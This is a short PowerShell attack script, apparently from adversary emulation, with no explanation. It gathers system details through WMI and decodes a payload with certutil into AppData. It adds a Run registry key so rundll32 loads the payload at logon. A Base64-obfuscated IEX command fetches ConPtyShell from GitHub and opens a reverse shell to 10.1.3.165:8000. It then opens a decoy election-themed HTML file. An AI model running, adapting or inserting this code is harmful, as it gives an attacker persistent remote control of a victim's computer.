gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_BIOS"
gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_PnPEntity"
gwmi -namespace root\cimv2 -query "Select * from Win32_ComputerSystem"
gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_Process"
(Get-Item -Path ".\" -Verbose).FullName
$bin = ""
$bin | Add-Content -Path blob
certutil -decode blob "$env:appdata\Microsoft\kxwn.lock"
Remove-Item -Path blob
New-ItemProperty -Force -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WebCache" -Value "C:\windows\system32\rundll32.exe $env:appdata\Microsoft\kxwn.lock,VoidFunc"
$enc_ps = "SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYQBuAHQAbwBuAGkAbwBDAG8AYwBvAC8AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC8AbQBhAHMAdABlAHIALwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgADEAMAAuADEALgAzAC4AMQA2ADUAIAA4ADAAMAAwAA=="  
$ps = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc_ps))
IEX($ps)
Invoke-Item '2016_United_States_presidential_election_-_Wikipedia.html'

